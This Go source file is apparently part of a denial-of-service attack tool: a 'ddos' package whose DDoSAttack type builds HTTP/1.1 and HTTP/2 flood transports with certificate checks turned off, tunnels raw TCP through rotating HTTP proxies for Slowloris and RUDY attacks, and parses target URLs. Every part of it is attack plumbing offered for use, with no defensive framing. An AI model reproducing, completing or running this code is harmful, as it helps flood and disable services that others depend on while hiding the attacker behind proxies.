package ddos

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"golang.org/x/net/http2"
)

// createHTTP2Transport creates an HTTP/2 enabled transport
func (d *DDoSAttack) createHTTP2Transport() (*http.Transport, error) {
	tlsConfig := d.createTLSConfig()
	transport := &http.Transport{
		TLSClientConfig: tlsConfig,
		MaxIdleConns:    d.config.MaxThreads,
		DialContext: (&net.Dialer{
			Timeout:   d.config.Timeout,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		DisableKeepAlives: !d.config.ReuseConnections,
	}

	// Configure HTTP/2
	if err := http2.ConfigureTransport(transport); err != nil {
		return nil, fmt.Errorf("failed to configure HTTP/2: %w", err)
	}

	return transport, nil
}

// createHTTP1Transport creates a standard HTTP/1.1 transport
func (d *DDoSAttack) createHTTP1Transport(numWorkers int) *http.Transport {
	tlsConfig := d.createTLSConfig()
	return &http.Transport{
		TLSClientConfig:     tlsConfig,
		MaxIdleConns:        numWorkers,
		MaxIdleConnsPerHost: numWorkers,
		IdleConnTimeout:     30 * time.Second,
		DisableKeepAlives:   !d.config.ReuseConnections,
		DialContext: (&net.Dialer{
			Timeout:   d.config.Timeout,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
}

// createTLSConfig creates a TLS config based on attack settings
func (d *DDoSAttack) createTLSConfig() *tls.Config {
	config := &tls.Config{
		InsecureSkipVerify: true,
	}

	// Set TLS version range
	if d.config.TLSMinVersion > 0 {
		config.MinVersion = d.config.TLSMinVersion
	}
	if d.config.TLSMaxVersion > 0 {
		config.MaxVersion = d.config.TLSMaxVersion
	}

	// Set cipher suites if specified
	if len(d.config.TLSCipherSuites) > 0 {
		config.CipherSuites = d.config.TLSCipherSuites
	}

	return config
}

// dialThroughHTTPProxy establishes a TCP (optionally TLS-wrapped) connection to the
// target host:port through an HTTP proxy using the CONNECT method.
//
// This helper is used by low-level TCP attacks (e.g. Slowloris, RUDY) so they can
// reuse the same proxy rotation and health-checking logic as the HTTP flood modes.
func (d *DDoSAttack) dialThroughHTTPProxy(
	dialer *net.Dialer,
	proxyURL string,
	targetHost string,
	targetPort string,
	useTLS bool,
) (net.Conn, error) {
	parsed, err := url.Parse(proxyURL)
	if err != nil {
		return nil, fmt.Errorf("invalid proxy URL %q: %w", proxyURL, err)
	}

	// Only plain HTTP proxies are supported for raw TCP attacks.
	if parsed.Scheme != "http" {
		return nil, fmt.Errorf("unsupported proxy scheme %q for raw TCP attacks", parsed.Scheme)
	}

	proxyHost := parsed.Host
	if !strings.Contains(proxyHost, ":") {
		// Default to port 80 when not specified
		proxyHost = net.JoinHostPort(parsed.Hostname(), "80")
	}

	// Connect to proxy
	conn, err := dialer.Dial("tcp", proxyHost)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to proxy %q: %w", proxyHost, err)
	}

	targetAddr := net.JoinHostPort(targetHost, targetPort)

	// Send CONNECT request
	connectReq := fmt.Sprintf(
		"CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Connection: keep-alive\r\n\r\n",
		targetAddr,
		targetAddr,
	)

	if _, err := conn.Write([]byte(connectReq)); err != nil {
		conn.Close()
		return nil, fmt.Errorf("failed to write CONNECT request: %w", err)
	}

	// Read proxy response headers
	br := bufio.NewReader(conn)

	statusLine, err := br.ReadString('\n')
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("failed to read proxy response: %w", err)
	}

	// Expect 200 status for successful tunnel
	if !strings.Contains(statusLine, "200") {
		// Drain remaining headers before closing
		for {
			line, err := br.ReadString('\n')
			if err != nil || line == "\r\n" || line == "\n" {
				break
			}
		}
		conn.Close()
		return nil, fmt.Errorf("proxy CONNECT failed: %s", strings.TrimSpace(statusLine))
	}

	// Drain the rest of the headers
	for {
		line, err := br.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				break
			}
			conn.Close()
			return nil, fmt.Errorf("failed reading proxy headers: %w", err)
		}
		if line == "\r\n" || line == "\n" {
			break
		}
	}

	// At this point we have a tunnel to targetHost:targetPort over conn.
	if !useTLS {
		return conn, nil
	}

	// Wrap the tunneled connection with TLS.
	tlsConfig := d.createTLSConfig()
	tlsConn := tls.Client(conn, tlsConfig)
	if err := tlsConn.Handshake(); err != nil {
		conn.Close()
		return nil, fmt.Errorf("TLS handshake over proxy failed: %w", err)
	}

	return tlsConn, nil
}

// shouldUseTLS determines if TLS should be used based on URL or ForceTLS flag
func (d *DDoSAttack) shouldUseTLS(targetURL string) (bool, string, string) {
	// Check if URL already uses HTTPS
	if strings.HasPrefix(targetURL, "https://") {
		return true, "443", targetURL
	}

	// Check if ForceTLS is enabled
	if d.config.ForceTLS {
		// Convert HTTP to HTTPS
		if strings.HasPrefix(targetURL, "http://") {
			httpsURL := strings.Replace(targetURL, "http://", "https://", 1)
			return true, "443", httpsURL
		}
		// If no scheme, assume HTTPS
		if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
			httpsURL := "https://" + targetURL
			return true, "443", httpsURL
		}
	}

	// Default: use TLS only for HTTPS URLs
	if strings.HasPrefix(targetURL, "https://") {
		return true, "443", targetURL
	}

	return false, "80", targetURL
}

// parseTargetURL extracts host, port, and path from target URL
func (d *DDoSAttack) parseTargetURL(targetURL string, useTLS bool) (host, port, path string) {
	// Remove scheme
	host = targetURL
	if strings.HasPrefix(host, "https://") {
		host = strings.TrimPrefix(host, "https://")
	} else if strings.HasPrefix(host, "http://") {
		host = strings.TrimPrefix(host, "http://")
	}

	// Extract path
	if idx := strings.Index(host, "/"); idx != -1 {
		path = host[idx:]
		host = host[:idx]
	} else {
		path = "/"
	}

	// Extract port
	port = "80"
	if useTLS {
		port = "443"
	}
	if idx := strings.Index(host, ":"); idx != -1 {
		port = host[idx+1:]
		host = host[:idx]
	}

	return host, port, path
}

